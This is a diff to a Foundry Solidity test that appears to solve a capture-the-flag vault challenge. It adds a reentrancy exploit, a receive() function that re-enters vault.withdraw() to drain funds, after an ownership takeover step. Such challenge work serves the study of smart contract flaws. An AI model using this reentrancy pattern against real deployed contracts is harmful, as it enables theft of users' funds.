@@ -10,12 +10,14 @@ contract VaultTest is Test {
     address private owner = address(0xDDDD);
     address player = address(this);
 
+    bool start_attack = false;
+
 
     function setUp() public {
         vm.deal(owner, 1 ether);
         vm.startPrank(owner);
 
-        bytes32 password = "123456";
+        bytes32 password = "0x123456";
         logic = new VaultLogic(password);
         vault = new Vault(address(logic));
         vault.deposite{value: 1 ether}();
@@ -34,16 +36,21 @@ contract VaultTest is Test {
 
         assertEq(vault.owner(), player, "Owner was not changed correctly!");
 
+
         vault.deposite{value: 1 ether}();
         uint depositBalance = vault.deposites(player);
         assertEq(depositBalance, 1 ether, "Deposit amount is incorrect");
 
         vault.openWithdraw();
 
+        start_attack = true;
+
         vault.withdraw();
 
         depositBalance = vault.deposites(player);
         assertEq(depositBalance, 0, "Withdraw failed");
+
+        require(vault.isSolve(), "solved");
     }
 
     function attack(bytes32 _password, address _owner) public {
@@ -57,5 +64,10 @@ contract VaultTest is Test {
         require(success, "Attack failed");
     }
 
-    receive() external payable {}
+    receive() external payable {
+        if(start_attack){
+             console2.log("-------attacked ------");
+            vault.withdraw();
+        }
+    }
 }
